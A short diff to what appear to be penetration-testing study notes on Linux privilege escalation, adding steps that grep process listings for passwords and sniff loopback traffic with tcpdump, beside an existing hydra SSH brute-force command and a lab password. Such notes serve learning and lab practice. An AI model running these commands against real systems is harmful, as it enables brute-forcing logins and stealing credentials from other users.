@@ -1380,7 +1380,10 @@ Reference
     `hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`
   - elevate to root 
     `sudo -i` `whoami`	(use user's password)
-  - dd    
+  - Harvesting Active Processes for Credentials > sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'  
+    `watch -n 1 "ps -aux | grep pass"`
+  - Use tcpdump to sniff password > user:root,pass:lab  
+    `sudo tcpdump -i lo -A | grep "pass"`   
 - insecure file permission  
 - abuse system linux components  
 
